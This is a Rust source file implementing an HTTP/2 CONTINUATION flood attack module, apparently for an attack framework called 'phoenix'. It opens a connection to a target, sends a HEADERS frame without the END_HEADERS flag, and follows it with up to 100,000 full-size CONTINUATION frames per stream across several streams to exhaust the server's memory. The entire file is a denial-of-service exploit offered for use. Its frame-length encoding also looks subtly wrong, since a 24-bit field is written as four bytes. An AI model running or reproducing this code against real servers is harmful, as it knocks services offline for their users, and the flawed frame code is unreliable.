//! HTTP/2 CONTINUATION Flood Attack (CVE-2024-27983 family)
//!
//! This attack exploits the HTTP/2 CONTINUATION frame mechanism to force
//! servers to buffer excessive amounts of header data.
//!
//! The attack works by:
//! 1. Opening an HTTP/2 connection to the target
//! 2. Sending a HEADERS frame with END_HEADERS flag NOT set
//! 3. Sending a large number of CONTINUATION frames, none with END_HEADERS set
//! 4. The server must buffer all frames until END_HEADERS is received
//! 5. This can exhaust server memory or cause CPU spikes during processing

use std::sync::Arc;
use std::time::{Duration, Instant};

use bytes::Bytes;
use phoenix_core::RawH2Connection;
use phoenix_metrics::AttackMetrics;
use tracing::{info, warn, error};

use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};

/// HTTP/2 CONTINUATION Flood Attack implementation
pub struct ContinuationFloodAttack {
    /// Number of CONTINUATION frames to send per stream
    frames_per_stream: u32,
    
    /// Size of each CONTINUATION frame payload
    frame_size: usize,
    
    /// Number of streams to attack with
    streams: u32,
}

impl ContinuationFloodAttack {
    /// Create a new ContinuationFloodAttack with default configuration
    pub fn new() -> Self {
        Self {
            frames_per_stream: 100_000,
            frame_size: 16384, // Max frame size
            streams: 10,
        }
    }
    
    /// Set the number of CONTINUATION frames per stream
    pub fn with_frames_per_stream(mut self, frames_per_stream: u32) -> Self {
        self.frames_per_stream = frames_per_stream;
        self
    }
    
    /// Set the size of each CONTINUATION frame
    pub fn with_frame_size(mut self, frame_size: usize) -> Self {
        self.frame_size = frame_size;
        self
    }
    
    /// Set the number of streams to attack
    pub fn with_streams(mut self, streams: u32) -> Self {
        self.streams = streams;
        self
    }
    
    /// Build a HEADERS frame without END_HEADERS flag
    fn build_headers_frame(&self, stream_id: u32) -> Bytes {
        use bytes::BufMut;
        
        // Build minimal headers block
        let headers_block = self.build_minimal_headers_block();
        let headers_len = headers_block.len();
        
        let mut buf = bytes::BytesMut::with_capacity(9 + headers_len);
        
        // Frame length
        buf.put_u32(headers_len as u32);
        
        // Frame type: HEADERS (0x01)
        buf.put_u8(0x01);
        
        // Flags: END_STREAM=0, END_HEADERS=0, PADDED=0, PRIORITY=0
        buf.put_u8(0x00);
        
        // Stream identifier
        buf.put_u32(stream_id);
        
        // Headers block fragment
        buf.extend_from_slice(&headers_block);
        
        buf.freeze()
    }
    
    /// Build a CONTINUATION frame
    fn build_continuation_frame(&self, stream_id: u32, is_last: bool) -> Bytes {
        use bytes::BufMut;
        
        let mut buf = bytes::BytesMut::with_capacity(9 + self.frame_size);
        
        // Frame length
        buf.put_u32(self.frame_size as u32);
        
        // Frame type: CONTINUATION (0x09)
        buf.put_u8(0x09);
        
        // Flags: END_HEADERS only if this is the last frame
        let flags = if is_last { 0x04 } else { 0x00 };
        buf.put_u8(flags);
        
        // Stream identifier
        buf.put_u32(stream_id);
        
        // Payload: repeated pattern to fill frame
        let payload = vec![b'X'; self.frame_size];
        buf.extend_from_slice(&payload);
        
        buf.freeze()
    }
    
    /// Build a minimal HPACK headers block
    fn build_minimal_headers_block(&self) -> Vec<u8> {
        use bytes::BufMut;
        
        // Minimal headers: :method GET, :path /
        let mut buf = bytes::BytesMut::new();
        
        // :method: GET (indexed - 2)
        buf.put_u8(0x82);
        
        // :path: / (indexed - 4)
        buf.put_u8(0x84);
        
        buf.to_vec()
    }
}

#[async_trait]
impl Attack for ContinuationFloodAttack {
    fn name(&self) -> &str {
        "http2-continuation-flood"
    }
    
    fn description(&self) -> &str {
        "HTTP/2 CONTINUATION Flood Attack (CVE-2024-27983 family). Sends HEADERS frame without END_HEADERS flag followed by many CONTINUATION frames, forcing servers to buffer excessive header data."
    }
    
    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        info!("Starting HTTP/2 CONTINUATION Flood Attack against {}", ctx.target);
        
        let (target_host, target_port) = parse_target(&ctx.target)?;
        
        // Use context values if provided, otherwise use struct defaults
        let frames_per_stream = ctx.extra.get("frames_per_stream")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.frames_per_stream);
        let frame_size = ctx.extra.get("frame_size")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.frame_size);
        let streams = ctx.extra.get("streams")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.streams);
        
        info!("Configuration: {} streams, {} frames per stream, {} bytes per frame", 
              streams, frames_per_stream, frame_size);
        
        let metrics = ctx.metrics.clone();
        let start_time = Instant::now();
        
        // Connect to target
        let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
            Ok(conn) => conn,
            Err(e) => return Err(AttackError::Connection(e)),
        };
        
        info!("Connected to {}:{}", target_host, target_port);
        
        // Perform TLS and HTTP/2 handshake
        connection.handshake().await.map_err(AttackError::Connection)?;
        
        let mut total_frames = 0u64;
        let mut errors = 0u64;
        let mut next_stream_id = 1u32;
        
        // Attack each stream
        for stream_idx in 0..streams {
            if start_time.elapsed() > ctx.duration {
                info!("Attack duration reached, stopping");
                break;
            }
            
            let stream_id = next_stream_id;
            next_stream_id = next_stream_id.wrapping_add(2);
            
            info!("Attacking stream {} (id: {})", stream_idx + 1, stream_id);
            
            // Send HEADERS frame without END_HEADERS
            let headers_frame = self.build_headers_frame(stream_id);
            if let Err(e) = connection.send_frame(headers_frame).await {
                error!("Failed to send HEADERS frame for stream {}: {}", stream_id, e);
                errors += 1;
                continue;
            }
            
            total_frames += 1;
            metrics.increment_requests();
            
            // Send CONTINUATION frames
            for frame_idx in 0..frames_per_stream {
                if start_time.elapsed() > ctx.duration {
                    break;
                }
                
                // Last frame has END_HEADERS flag
                let is_last = frame_idx == frames_per_stream - 1;
                let continuation_frame = self.build_continuation_frame(stream_id, is_last);
                
                if let Err(e) = connection.send_frame(continuation_frame).await {
                    error!("Failed to send CONTINUATION frame {} for stream {}: {}", 
                           frame_idx + 1, stream_id, e);
                    errors += 1;
                    break;
                }
                
                total_frames += 1;
                metrics.increment_requests();
                
                // Small yield every 1000 frames
                if total_frames % 1000 == 0 {
                    tokio::task::yield_now().await;
                }
            }
            
            // If we didn't send the last CONTINUATION with END_HEADERS,
            // send a final CONTINUATION with END_HEADERS to clean up
            if frames_per_stream == 0 {
                let final_frame = self.build_continuation_frame(stream_id, true);
                if let Err(e) = connection.send_frame(final_frame).await {
                    error!("Failed to send final CONTINUATION frame for stream {}: {}", stream_id, e);
                    errors += 1;
                } else {
                    total_frames += 1;
                    metrics.increment_requests();
                }
            }
            
            info!("Completed stream {}: {} frames sent", stream_idx + 1, frames_per_stream);
        }
        
        let actual_duration = start_time.elapsed();
        let snapshot = metrics.snapshot();
        
        info!("Attack completed: {} frames sent, {} errors, duration: {:?}", 
              total_frames, errors, actual_duration);
        
        Ok(AttackResult {
            success: true,
            total_requests: total_frames,
            errors,
            duration: actual_duration,
            snapshot,
        })
    }
}

impl Default for ContinuationFloodAttack {
    fn default() -> Self {
        Self::new()
    }
}